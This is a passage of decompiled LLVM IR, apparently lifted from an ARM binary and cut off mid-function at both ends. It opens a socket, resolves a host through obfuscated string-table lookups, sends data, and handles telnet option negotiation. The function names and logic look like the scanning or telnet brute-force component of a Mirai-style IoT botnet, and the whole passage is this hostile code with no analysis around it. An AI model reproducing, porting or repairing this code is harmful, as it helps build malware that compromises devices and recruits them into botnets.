  store i1 %v2_f900, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f900, label %dec_label_pc_f908, label %dec_label_pc_f94c

dec_label_pc_f908:                                ; preds = %bb430
  store i32 2, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v3_f914 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 %v3_f914, i32* %r0.global-to-local, align 4
  %v2_f918 = icmp eq i32 %v3_f914, -1
  store i1 %v2_f918, i1* %cpsr_c.global-to-local, align 1
  %v7_f918 = icmp eq i32 %v3_f914, -1
  store i1 %v7_f918, i1* %cpsr_z.global-to-local, align 1
  store i32 %v3_f914, i32* @r8, align 4
  br i1 %v7_f918, label %dec_label_pc_10474, label %dec_label_pc_f924

dec_label_pc_f924:                                ; preds = %dec_label_pc_f908
  store i32 3, i32* %r0.global-to-local, align 4
  %v1_f928 = call i32 @table_unlock_val(i32 3)
  store i32 4, i32* %r0.global-to-local, align 4
  %v1_f930 = call i32 @table_unlock_val(i32 4)
  %v0_f934 = load i32, i32* @sl, align 4
  store i32 %v0_f934, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r0.global-to-local, align 4
  %v2_f93c = inttoptr i32 %v0_f934 to i32*
  %v3_f93c = call i32 @table_retrieve_val(i32 3, i32* %v2_f93c)
  store i32 %v3_f93c, i32* %r0.global-to-local, align 4
  %v1_f940 = call i32 @resolv_lookup(i32 %v3_f93c)
  store i32 %v1_f940, i32* %r0.global-to-local, align 4
  store i32 %v1_f940, i32* @r5, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v3_f944 = icmp eq i32 %v1_f940, 0
  store i1 %v3_f944, i1* %cpsr_z.global-to-local, align 1
  br i1 %v3_f944, label %dec_label_pc_f94c, label %dec_label_pc_10354

dec_label_pc_f94c:                                ; preds = %.thread84, %dec_label_pc_f924, %bb430
  %v0_f94c = load i32, i32* @r6, align 4
  %v1_f94c = add i32 %v0_f94c, 4
  %v2_f94c = inttoptr i32 %v1_f94c to i32*
  %v3_f94c = load i32, i32* %v2_f94c, align 4
  store i32 %v3_f94c, i32* %r0.global-to-local, align 4
  %v1_f950 = call i32 @__GI___libc_close(i32 %v3_f94c)
  store i32 %v1_f950, i32* %r0.global-to-local, align 4
  store i32 -1, i32* @r3, align 4
  store i32 0, i32* %r2.global-to-local, align 4
  %v1_f95c = load i32, i32* @r6, align 4
  %v2_f95c = add i32 %v1_f95c, 4
  %v3_f95c = inttoptr i32 %v2_f95c to i32*
  store i32 -1, i32* %v3_f95c, align 4
  %v0_f960 = load i32, i32* %r2.global-to-local, align 4
  %v1_f960 = load i32, i32* @r6, align 4
  %v2_f960 = add i32 %v1_f960, 12
  %v3_f960 = inttoptr i32 %v2_f960 to i32*
  store i32 %v0_f960, i32* %v3_f960, align 4
  br label %dec_label_pc_f964

dec_label_pc_f964:                                ; preds = %dec_label_pc_fb28, %bb439, %dec_label_pc_100ec, %dec_label_pc_f8c4, %dec_label_pc_10190, %dec_label_pc_fedc, %dec_label_pc_f94c
  %v0_f964 = load i32, i32* @r7, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f964 = icmp eq i32 %v0_f964, 0
  store i1 %v2_f964, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_f964, label %dec_label_pc_f718.loopexit, label %dec_label_pc_f96c

dec_label_pc_f96c:                                ; preds = %dec_label_pc_f964, %dec_label_pc_ff90, %dec_label_pc_fdd0, %dec_label_pc_fc88, %dec_label_pc_fbb4, %dec_label_pc_fa10, %dec_label_pc_10264, %dec_label_pc_10208
  %v0_f96c = load i32, i32* @r6, align 4
  %v1_f96c = add i32 %v0_f96c, 24
  %v2_f96c = inttoptr i32 %v1_f96c to i32*
  %v3_f96c = load i32, i32* %v2_f96c, align 4
  %v0_f970 = load i32, i32* @r7, align 4
  %v2_f970 = sub i32 %v0_f970, %v3_f96c
  %v3_f970 = icmp uge i32 %v0_f970, %v3_f96c
  store i1 %v3_f970, i1* %cpsr_c.global-to-local, align 1
  %v4_f970 = xor i32 %v0_f970, %v3_f96c
  %v5_f970 = xor i32 %v2_f970, %v0_f970
  %v6_f970 = and i32 %v5_f970, %v4_f970
  %v7_f970 = icmp slt i32 %v6_f970, 0
  %v8_f970 = icmp slt i32 %v2_f970, 0
  %v9_f970 = icmp eq i32 %v0_f970, %v3_f96c
  store i1 %v9_f970, i1* %cpsr_z.global-to-local, align 1
  %v2_f974 = xor i1 %v8_f970, %v7_f970
  %v0_f970.v3_f96c = select i1 %v2_f974, i32 %v0_f970, i32 %v3_f96c
  store i32 %v0_f970.v3_f96c, i32* %r1.global-to-local, align 4
  %v2_f97c = sub i32 %v3_f96c, %v0_f970.v3_f96c
  store i32 %v2_f97c, i32* @r2, align 4
  store i32 %v2_f97c, i32* %v2_f96c, align 4
  %v0_f984 = load i32, i32* @fp, align 4
  %v1_f984 = load i32, i32* %r1.global-to-local, align 4
  %v2_f984 = add i32 %v1_f984, %v0_f984
  store i32 %v2_f984, i32* @r1, align 4
  store i32 %v0_f984, i32* @r0, align 4
  %v3_f98c = call i32 @memmove(i32 %v0_f984, i32 %v2_f984, i32 %v2_f97c)
  store i32 %v3_f98c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_f79c

dec_label_pc_f994:                                ; preds = %dec_label_pc_f79c
  %v1_f994 = add i32 %v0_f79c, 24
  %v2_f994 = inttoptr i32 %v1_f994 to i32*
  %v3_f994 = load i32, i32* %v2_f994, align 4
  store i32 %v3_f994, i32* %r2.global-to-local, align 4
  %v1_f998 = add i32 %v3_f994, -1
  store i32 %v1_f998, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_f99c = icmp eq i32 %v1_f998, 0
  store i1 %v2_f99c, i1* %cpsr_z.global-to-local, align 1
  %tmp433 = icmp slt i32 %v1_f998, 1
  br i1 %tmp433, label %dec_label_pc_f71c.backedge.thread, label %dec_label_pc_f9a4

dec_label_pc_f9a4:                                ; preds = %dec_label_pc_f994
  %v2_f9a4 = add i32 %v1_f998, %v0_f79c
  store i32 %v2_f9a4, i32* %r3.global-to-local, align 4
  %v1_f9a8 = add i32 %v2_f9a4, 28
  %v2_f9a8 = inttoptr i32 %v1_f9a8 to i8*
  %v3_f9a8 = load i8, i8* %v2_f9a8, align 1
  %v4_f9a8 = zext i8 %v3_f9a8 to i32
  store i32 %v4_f9a8, i32* %r3.global-to-local, align 4
  %v2_f9ac = icmp ugt i8 %v3_f9a8, 61
  store i1 %v2_f9ac, i1* %cpsr_c.global-to-local, align 1
  %v7_f9ac = icmp eq i8 %v3_f9a8, 62
  store i1 %v7_f9ac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9ac, label %dec_label_pc_fa10, label %bb434

bb434:                                            ; preds = %dec_label_pc_f9a4
  %v3_f9b0 = icmp ugt i8 %v3_f9a8, 57
  store i1 %v3_f9b0, i1* %cpsr_c.global-to-local, align 1
  %v8_f9b0 = icmp eq i8 %v3_f9a8, 58
  store i1 %v8_f9b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_f9b0, label %dec_label_pc_fa10, label %dec_label_pc_f9b8

dec_label_pc_f9b8:                                ; preds = %bb434
  %v2_f9b8 = icmp ugt i8 %v3_f9a8, 35
  store i1 %v2_f9b8, i1* %cpsr_c.global-to-local, align 1
  %v7_f9b8 = icmp eq i8 %v3_f9a8, 36
  store i1 %v7_f9b8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9b8, label %dec_label_pc_fa10, label %dec_label_pc_f9c0

dec_label_pc_f9c0:                                ; preds = %dec_label_pc_f9b8
  %v2_f9c0 = icmp ugt i8 %v3_f9a8, 34
  store i1 %v2_f9c0, i1* %cpsr_c.global-to-local, align 1
  %v7_f9c0 = icmp eq i8 %v3_f9a8, 35
  store i1 %v7_f9c0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9c0, label %dec_label_pc_fa10, label %dec_label_pc_f9c8

dec_label_pc_f9c8:                                ; preds = %dec_label_pc_f9c0
  %v2_f9c8 = icmp ugt i8 %v3_f9a8, 36
  store i1 %v2_f9c8, i1* %cpsr_c.global-to-local, align 1
  %v7_f9c8 = icmp eq i8 %v3_f9a8, 37
  store i1 %v7_f9c8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9c8, label %dec_label_pc_fa10, label %dec_label_pc_f9f8.preheader

dec_label_pc_f9f8.preheader:                      ; preds = %dec_label_pc_f9c8
  %v3_f9cc = add i32 %v0_f79c, 28
  %v2_f9d0 = add i32 %v3_f9cc, %v3_f994
  store i32 %v2_f9d0, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_f9f8

dec_label_pc_f9dc:                                ; preds = %bb435
  %v2_f9dc = icmp ugt i8 %v3_fa00, 35
  store i1 %v2_f9dc, i1* %cpsr_c.global-to-local, align 1
  %v7_f9dc = icmp eq i8 %v3_fa00, 36
  store i1 %v7_f9dc, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9dc, label %dec_label_pc_fa10, label %dec_label_pc_f9e4

dec_label_pc_f9e4:                                ; preds = %dec_label_pc_f9dc
  %v2_f9e4 = icmp ugt i8 %v3_fa00, 34
  store i1 %v2_f9e4, i1* %cpsr_c.global-to-local, align 1
  %v7_f9e4 = icmp eq i8 %v3_fa00, 35
  store i1 %v7_f9e4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9e4, label %dec_label_pc_fa10, label %dec_label_pc_f9ec

dec_label_pc_f9ec:                                ; preds = %dec_label_pc_f9e4
  %v2_f9ec = icmp ugt i8 %v3_fa00, 36
  store i1 %v2_f9ec, i1* %cpsr_c.global-to-local, align 1
  %v7_f9ec = icmp eq i8 %v3_fa00, 37
  store i1 %v7_f9ec, i1* %cpsr_z.global-to-local, align 1
  %v1_f9f0 = add i32 %v0_f9f0, -1
  store i32 %v1_f9f0, i32* %r3.global-to-local, align 4
  br i1 %v7_f9ec, label %dec_label_pc_fa10, label %dec_label_pc_f9f8

dec_label_pc_f9f8:                                ; preds = %dec_label_pc_f9f8.preheader, %dec_label_pc_f9ec
  %v0_f9f0 = phi i32 [ %v2_f9d0, %dec_label_pc_f9f8.preheader ], [ %v1_f9f0, %dec_label_pc_f9ec ]
  %v0_f9f8 = phi i32 [ %v1_f998, %dec_label_pc_f9f8.preheader ], [ %v1_f9f8, %dec_label_pc_f9ec ]
  %v1_f9f8 = add i32 %v0_f9f8, -1
  store i32 %v1_f9f8, i32* %r1.global-to-local, align 4
  %v2_f9f8 = icmp ne i32 %v0_f9f8, 0
  store i1 %v2_f9f8, i1* %cpsr_c.global-to-local, align 1
  %v7_f9f8 = icmp eq i32 %v0_f9f8, 1
  store i1 %v7_f9f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_f9f8, label %dec_label_pc_f71c.backedge.thread565, label %dec_label_pc_fa00

dec_label_pc_fa00:                                ; preds = %dec_label_pc_f9f8
  %v1_fa00 = add i32 %v0_f9f0, -2
  %v2_fa00 = inttoptr i32 %v1_fa00 to i8*
  %v3_fa00 = load i8, i8* %v2_fa00, align 1
  %v4_fa00 = zext i8 %v3_fa00 to i32
  store i32 %v4_fa00, i32* %r2.global-to-local, align 4
  %v2_fa04 = icmp ugt i8 %v3_fa00, 61
  store i1 %v2_fa04, i1* %cpsr_c.global-to-local, align 1
  %v7_fa04 = icmp eq i8 %v3_fa00, 62
  store i1 %v7_fa04, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fa04, label %dec_label_pc_fa10, label %bb435

bb435:                                            ; preds = %dec_label_pc_fa00
  %v3_fa08 = icmp ugt i8 %v3_fa00, 57
  store i1 %v3_fa08, i1* %cpsr_c.global-to-local, align 1
  %v8_fa08 = icmp eq i8 %v3_fa00, 58
  store i1 %v8_fa08, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_fa08, label %dec_label_pc_fa10, label %dec_label_pc_f9dc

dec_label_pc_fa10:                                ; preds = %dec_label_pc_fa00, %bb435, %dec_label_pc_f9ec, %dec_label_pc_f9e4, %dec_label_pc_f9dc, %dec_label_pc_f9c8, %dec_label_pc_f9a4, %dec_label_pc_f9c0, %dec_label_pc_f9b8, %bb434
  %v0_fa14 = phi i32 [ %v1_f998, %dec_label_pc_f9c8 ], [ %v1_f998, %dec_label_pc_f9a4 ], [ %v1_f998, %dec_label_pc_f9c0 ], [ %v1_f998, %dec_label_pc_f9b8 ], [ %v1_f998, %bb434 ], [ %v1_f9f8, %dec_label_pc_f9dc ], [ %v1_f9f8, %dec_label_pc_f9e4 ], [ %v1_f9f8, %dec_label_pc_f9ec ], [ %v1_f9f8, %bb435 ], [ %v1_f9f8, %dec_label_pc_fa00 ]
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_fa14 = add i32 %v0_fa14, 1
  store i32 %v1_fa14, i32* @r7, align 4
  %v1_fa18 = call i32 @table_unlock_val(i32 10)
  store i32 %v2_10078, i32* %r1.global-to-local, align 4
  store i32 10, i32* %r0.global-to-local, align 4
  %v3_fa28 = call i32 @table_retrieve_val(i32 10, i32* nonnull %stack_var_-60)
  store i32 %v3_fa28, i32* %r0.global-to-local, align 4
  %v3_fa2c = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_fa2c, i32* %r2.global-to-local, align 4
  store i32 %v3_fa28, i32* %r1.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v0_fa38 = load i32, i32* @r6, align 4
  %v1_fa38 = add i32 %v0_fa38, 4
  %v2_fa38 = inttoptr i32 %v1_fa38 to i32*
  %v3_fa38 = load i32, i32* %v2_fa38, align 4
  store i32 %v3_fa38, i32* %r0.global-to-local, align 4
  %v4_fa3c = call i32 @__libc_send(i32 %v3_fa38, i32 %v3_fa28, i32 %v3_fa2c, i32 16384)
  store i32 %v4_fa3c, i32* %r0.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  store i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32* %r1.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v0_fa4c = load i32, i32* @r6, align 4
  %v1_fa4c = add i32 %v0_fa4c, 4
  %v2_fa4c = inttoptr i32 %v1_fa4c to i32*
  %v3_fa4c = load i32, i32* %v2_fa4c, align 4
  store i32 %v3_fa4c, i32* %r0.global-to-local, align 4
  %v4_fa50 = call i32 @__libc_send(i32 %v3_fa4c, i32 ptrtoint ([3 x i8]* @global_var_19b60.207 to i32), i32 2, i32 16384)
  store i32 10, i32* %r0.global-to-local, align 4
  %v1_fa58 = call i32 @table_lock_val(i32 10)
  store i32 %v1_fa58, i32* %r0.global-to-local, align 4
  store i32 10, i32* @r3, align 4
  %v1_fa60 = load i32, i32* @r6, align 4
  %v2_fa60 = add i32 %v1_fa60, 12
  %v3_fa60 = inttoptr i32 %v2_fa60 to i32*
  store i32 10, i32* %v3_fa60, align 4
  br label %dec_label_pc_f96c

dec_label_pc_fa68:                                ; preds = %dec_label_pc_f79c
  %v1_fa68 = add i32 %v0_f79c, 24
  %v2_fa68 = inttoptr i32 %v1_fa68 to i32*
  %v3_fa68 = load i32, i32* %v2_fa68, align 4
  store i32 %v3_fa68, i32* %r1.global-to-local, align 4
  %v0_fa6c = load i32, i32* @fp, align 4
  store i32 %v0_fa6c, i32* @r4, align 4
  store i32 0, i32* @r7, align 4
  %v3_fa74172 = icmp eq i32 %v3_fa68, 0
  store i1 %v3_fa74172, i1* %cpsr_c.global-to-local, align 1
  store i1 %v3_fa74172, i1* %cpsr_z.global-to-local, align 1
  %v6_fa78179 = icmp sgt i32 %v3_fa68, 0
  br i1 %v6_fa78179, label %dec_label_pc_fa7c.preheader, label %dec_label_pc_fb28

dec_label_pc_fa74.loopexit:                       ; preds = %dec_label_pc_fa98
  %v2_faa0 = add i32 %v1_faa0, 2
  store i32 %v2_faa0, i32* @r4, align 4
  %v2_faa4 = add i32 %v1_faa4, 2
  store i32 %v2_faa4, i32* @r7, align 4
  %v3_fa74 = icmp uge i32 %v2_faa4, %v1_fa74
  store i1 %v3_fa74, i1* %cpsr_c.global-to-local, align 1
  %v9_fa74 = icmp eq i32 %v2_faa4, %v1_fa74
  store i1 %v9_fa74, i1* %cpsr_z.global-to-local, align 1
  %v6_fa78 = icmp slt i32 %v2_faa4, %v1_fa74
  br i1 %v6_fa78, label %dec_label_pc_fa7c.preheader, label %dec_label_pc_fb28

dec_label_pc_fa7c.preheader:                      ; preds = %dec_label_pc_fa68, %dec_label_pc_fa74.loopexit
  %v6_fb30277 = phi i32 [ %v6_fb30278, %dec_label_pc_fa74.loopexit ], [ %v0_f79c, %dec_label_pc_fa68 ]
  %v1_faa4266 = phi i32 [ %v2_faa4, %dec_label_pc_fa74.loopexit ], [ 0, %dec_label_pc_fa68 ]
  %v1_fa88264 = phi i32 [ %v1_fa74, %dec_label_pc_fa74.loopexit ], [ %v3_fa68, %dec_label_pc_fa68 ]
  %v0_fa7c262 = phi i32 [ %v2_faa0, %dec_label_pc_fa74.loopexit ], [ %v0_fa6c, %dec_label_pc_fa68 ]
  br label %dec_label_pc_fa7c

dec_label_pc_fa7c:                                ; preds = %dec_label_pc_fa7c.preheader, %dec_label_pc_fb0c
  %v6_fb30278 = phi i32 [ %v6_fb30277, %dec_label_pc_fa7c.preheader ], [ %v0_fb14, %dec_label_pc_fb0c ]
  %v1_faa4 = phi i32 [ %v1_faa4266, %dec_label_pc_fa7c.preheader ], [ %v1_fb18, %dec_label_pc_fb0c ]
  %v1_fa74 = phi i32 [ %v1_fa88264, %dec_label_pc_fa7c.preheader ], [ %v3_fb14, %dec_label_pc_fb0c ]
  %v1_faa0 = phi i32 [ %v0_fa7c262, %dec_label_pc_fa7c.preheader ], [ %v1_fb20, %dec_label_pc_fb0c ]
  %v1_fa7c = inttoptr i32 %v1_faa0 to i8*
  %v2_fa7c = load i8, i8* %v1_fa7c, align 1
  %v3_fa7c = zext i8 %v2_fa7c to i32
  store i32 %v3_fa7c, i32* @r3, align 4
  %v2_fa80 = icmp eq i8 %v2_fa7c, -1
  store i1 %v2_fa80, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fa80, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa80, label %dec_label_pc_fa88, label %dec_label_pc_fb28

dec_label_pc_fa88:                                ; preds = %dec_label_pc_fa7c
  %v0_fa88 = load i32, i32* @fp, align 4
  %v2_fa88 = add i32 %v0_fa88, %v1_fa74
  store i32 %v2_fa88, i32* %r2.global-to-local, align 4
  %v1_fa8c = add i32 %v1_faa0, 1
  store i32 %v1_fa8c, i32* @r5, align 4
  %v3_fa90 = icmp uge i32 %v2_fa88, %v1_fa8c
  store i1 %v3_fa90, i1* %cpsr_c.global-to-local, align 1
  %v9_fa90 = icmp eq i32 %v2_fa88, %v1_fa8c
  store i1 %v9_fa90, i1* %cpsr_z.global-to-local, align 1
  %v2_fa94 = xor i1 %v3_fa90, true
  %v3_fa94 = or i1 %v9_fa90, %v2_fa94
  br i1 %v3_fa94, label %dec_label_pc_fb28, label %dec_label_pc_fa98

dec_label_pc_fa98:                                ; preds = %dec_label_pc_fa88
  %v2_fa98 = inttoptr i32 %v1_fa8c to i8*
  %v3_fa98 = load i8, i8* %v2_fa98, align 1
  %v4_fa98 = zext i8 %v3_fa98 to i32
  store i32 %v4_fa98, i32* @r3, align 4
  %v2_fa9c = icmp eq i8 %v3_fa98, -1
  store i1 %v2_fa9c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v2_fa9c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_fa9c, label %dec_label_pc_fa74.loopexit, label %dec_label_pc_faac

dec_label_pc_faac:                                ; preds = %dec_label_pc_fa98
  %v2_faac = icmp ugt i8 %v3_fa98, -4
  store i1 %v2_faac, i1* %cpsr_c.global-to-local, align 1
  %v7_faac = icmp eq i8 %v3_fa98, -3
  store i1 %v7_faac, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_faac, label %dec_label_pc_10108, label %dec_label_pc_fab4

dec_label_pc_fab4:                                ; preds = %dec_label_pc_faac
  %v1_fab4 = add i32 %v1_faa0, 2
  store i32 %v1_fab4, i32* @r3, align 4
  %v3_fab8 = icmp uge i32 %v2_fa88, %v1_fab4
  store i1 %v3_fab8, i1* %cpsr_c.global-to-local, align 1
  %v9_fab8 = icmp eq i32 %v2_fa88, %v1_fab4
  store i1 %v9_fab8, i1* %cpsr_z.global-to-local, align 1
  %v2_fabc = xor i1 %v3_fab8, true
  %v3_fabc = or i1 %v9_fab8, %v2_fabc
  br i1 %v3_fabc, label %dec_label_pc_fb28, label %dec_label_pc_fac0

dec_label_pc_fac0:                                ; preds = %dec_label_pc_1016c, %bb459, %.thread145, %dec_label_pc_fab4
  %v0_fac0 = load i32, i32* @r5, align 4
  %v1_fac0 = inttoptr i32 %v0_fac0 to i8*
  %v2_fac0 = load i8, i8* %v1_fac0, align 1
  %v3_fac0 = zext i8 %v2_fac0 to i32
  store i32 %v3_fac0, i32* %r3.global-to-local, align 4
  %v2_fac4 = icmp ugt i8 %v2_fac0, -4
  store i1 %v2_fac4, i1* %cpsr_c.global-to-local, align 1
  %v7_fac4 = icmp eq i8 %v2_fac0, -3
  store i1 %v7_fac4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fac4, label %.thread95, label %dec_label_pc_fad4

.thread95:                                        ; preds = %dec_label_pc_fac0
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v1_fac0, align 1
  %v0_fad0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_fad0.pr.pr, label %.thread98, label %.thread95.dec_label_pc_fad4thread-pre-split_crit_edge

.thread95.dec_label_pc_fad4thread-pre-split_crit_edge: ; preds = %.thread95
  %v0_fad4.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_fad4

dec_label_pc_fad4:                                ; preds = %dec_label_pc_fac0, %.thread95.dec_label_pc_fad4thread-pre-split_crit_edge
  %v0_fad4.pr = phi i32 [ %v0_fad4.pr.pre, %.thread95.dec_label_pc_fad4thread-pre-split_crit_edge ], [ %v3_fac0, %dec_label_pc_fac0 ]
  %v2_fad4 = icmp ugt i32 %v0_fad4.pr, 250
  store i1 %v2_fad4, i1* %cpsr_c.global-to-local, align 1
  %v7_fad4 = icmp eq i32 %v0_fad4.pr, 251
  store i1 %v7_fad4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fad4, label %bb436, label %.thread98

bb436:                                            ; preds = %dec_label_pc_fad4
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_fadc = load i32, i32* @r5, align 4
  %v4_fadc = inttoptr i32 %v3_fadc to i8*
  store i8 -3, i8* %v4_fadc, align 1
  br label %.thread98

.thread98:                                        ; preds = %dec_label_pc_fad4, %.thread95, %bb436
  %v0_fae0 = load i32, i32* @r4, align 4
  %v1_fae0 = add i32 %v0_fae0, 2
  %v2_fae0 = inttoptr i32 %v1_fae0 to i8*
  %v3_fae0 = load i8, i8* %v2_fae0, align 1
  %v4_fae0 = zext i8 %v3_fae0 to i32
  store i32 %v4_fae0, i32* %r3.global-to-local, align 4
  %v2_fae4 = icmp ugt i8 %v3_fae0, -4
  store i1 %v2_fae4, i1* %cpsr_c.global-to-local, align 1
  %v7_fae4 = icmp eq i8 %v3_fae0, -3
  store i1 %v7_fae4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_fae4, label %.thread99, label %dec_label_pc_faf4

.thread99:                                        ; preds = %.thread98
  store i32 -4, i32* %r3.global-to-local, align 4
  store i8 -4, i8* %v2_fae0, align 1
  %v0_faf0.pr.pr = load i1, i1* %cpsr_z.global-to-local, align 1
  br i1 %v0_faf0.pr.pr, label %.thread102, label %.thread99.dec_label_pc_faf4thread-pre-split_crit_edge

.thread99.dec_label_pc_faf4thread-pre-split_crit_edge: ; preds = %.thread99
  %v0_faf4.pr.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_faf4

dec_label_pc_faf4:                                ; preds = %.thread98, %.thread99.dec_label_pc_faf4thread-pre-split_crit_edge
  %v0_faf4.pr = phi i32 [ %v0_faf4.pr.pre, %.thread99.dec_label_pc_faf4thread-pre-split_crit_edge ], [ %v4_fae0, %.thread98 ]
  %v2_faf4 = icmp ugt i32 %v0_faf4.pr, 250
  store i1 %v2_faf4, i1* %cpsr_c.global-to-local, align 1
  %v7_faf4 = icmp eq i32 %v0_faf4.pr, 251
  store i1 %v7_faf4, i1* %cpsr_z.global-to-local, align 1
  br i1 %v7_faf4, label %bb437, label %.thread102

bb437:                                            ; preds = %dec_label_pc_faf4
  store i32 -3, i32* %r3.global-to-local, align 4
  %v3_fafc = load i32, i32* @r4, align 4
  %v4_fafc = add i32 %v3_fafc, 2
  %v5_fafc = inttoptr i32 %v4_fafc to i8*
  store i8 -3, i8* %v5_fafc, align 1
  br label %.thread102

.thread102:                                       ; preds = %dec_label_pc_faf4, %.thread99, %bb437
  %v0_fb00 = load i32, i32* @r6, align 4
  %v1_fb00 = add i32 %v0_fb00, 4
  %v2_fb00 = inttoptr i32 %v1_fb00 to i32*
  %v3_fb00 = load i32, i32* %v2_fb00, align 4
  store i32 %v3_fb00, i32* %r0.global-to-local, align 4
  %v0_fb04 = load i32, i32* @r4, align 4
  br label %dec_label_pc_fb0c

dec_label_pc_fb0c:                                ; preds = %dec_label_pc_1021c, %.thread102
  %v0_fb10 = phi i32 [ %v3_10230, %dec_label_pc_1021c ], [ %v3_fb00, %.thread102 ]
  %storemerge3 = phi i32 [ %v2_10120, %dec_label_pc_1021c ], [ %v0_fb04, %.thread102 ]
  %storemerge2 = phi i32 [ 9, %dec_label_pc_1021c ], [ 3, %.thread102 ]
  store i32 %storemerge3, i32* %r1.global-to-local, align 4
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  store i32 16384, i32* %r3.global-to-local, align 4
  %v4_fb10 = call i32 @__libc_send(i32 %v0_fb10, i32 %storemerge3, i32 %storemerge2, i32 16384)
  store i32 %v4_fb10, i32* %r0.global-to-local, align 4
  %v0_fb14 = load i32, i32* @r6, align 4
  %v1_fb14 = add i32 %v0_fb14, 24
  %v2_fb14 = inttoptr i32 %v1_fb14 to i32*
  %v3_fb14 = load i32, i32* %v2_fb14, align 4
  store i32 %v3_fb14, i32* %r1.global-to-local, align 4
  %v0_fb18 = load i32, i32* @r7, align 4
  %v1_fb18 = add i32 %v0_fb18, 3
  store i32 %v1_fb18, i32* @r7, align 4
  %v3_fb1c = icmp uge i32 %v1_fb18, %v3_fb14
  store i1 %v3_fb1c, i1* %cpsr_c.global-to-local, align 1
  %v9_fb1c = icmp eq i32 %v1_fb18, %v3_fb14
  store i1 %v9_fb1c, i1* %cpsr_z.global-to-local, align 1
  %v0_fb20 = load i32, i32* @r4, align 4
  %v1_fb20 = add i32 %v0_fb20, 3
  store i32 %v1_fb20, i32* @r4, align 4
  %v5_fb24 = icmp slt i32 %v1_fb18, %v3_fb14
  br i1 %v5_fb24, label %dec_label_pc_fa7c, label %dec_label_pc_fb28

dec_label_pc_fb28:                                ; preds = %dec_label_pc_fa74.loopexit, %dec_label_pc_fa7c, %dec_label_pc_fb0c, %dec_label_pc_fab4, %dec_label_pc_fa88, %dec_label_pc_fa68, %dec_label_pc_10108.dec_label_pc_fb28.loopexit_crit_edge
  %v6_fb30 = phi i32 [ %v0_10138, %dec_label_pc_10108.dec_label_pc_fb28.loopexit_crit_edge ], [ %v0_f79c, %dec_label_pc_fa68 ], [ %v6_fb30278, %dec_label_pc_fa7c ], [ %v0_fb14, %dec_label_pc_fb0c ], [ %v6_fb30278, %dec_label_pc_fab4 ], [ %v6_fb30278, %dec_label_pc_fa88 ], [ %v6_fb30278, %dec_label_pc_fa74.loopexit ]
  %v0_fb28 = phi i32 [ %v0_fb28.pre.pre, %dec_label_pc_10108.dec_label_pc_fb28.loopexit_crit_edge ], [ 0, %dec_label_pc_fa68 ], [ %v1_faa4, %dec_label_pc_fa7c ], [ %v1_fb18, %dec_label_pc_fb0c ], [ %v1_faa4, %dec_label_pc_fab4 ], [ %v1_faa4, %dec_label_pc_fa88 ], [ %v2_faa4, %dec_label_pc_fa74.loopexit ]
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb28 = icmp eq i32 %v0_fb28, 0
  store i1 %v2_fb28, i1* %cpsr_z.global-to-local, align 1
  %tmp438 = icmp slt i32 %v0_fb28, 1
  br i1 %tmp438, label %dec_label_pc_f964, label %bb439

bb439:                                            ; preds = %dec_label_pc_fb28
  store i32 3, i32* @r3, align 4
  %v7_fb30 = add i32 %v6_fb30, 12
  %v8_fb30 = inttoptr i32 %v7_fb30 to i32*
  store i32 3, i32* %v8_fb30, align 4
  br label %dec_label_pc_f964

dec_label_pc_fb38:                                ; preds = %dec_label_pc_f79c
  %v1_fb38 = add i32 %v0_f79c, 24
  %v2_fb38 = inttoptr i32 %v1_fb38 to i32*
  %v3_fb38 = load i32, i32* %v2_fb38, align 4
  store i32 %v3_fb38, i32* %r2.global-to-local, align 4
  %v1_fb3c = add i32 %v3_fb38, -1
  store i32 %v1_fb3c, i32* %r1.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_fb40 = icmp eq i32 %v1_fb3c, 0
  store i1 %v2_fb40, i1* %cpsr_z.global-to-local, align 1
  %tmp440 = icmp slt i32 %v1_fb3c, 1
  br i1 %tmp440, label %dec_label_pc_f71c.backedge.thread, label %dec_label_pc_fb48

dec_label_pc_fb48:                                ; preds = %dec_label_pc_fb38
  %v2_fb48 = add i32 %v1_fb3c, %v0_f79c
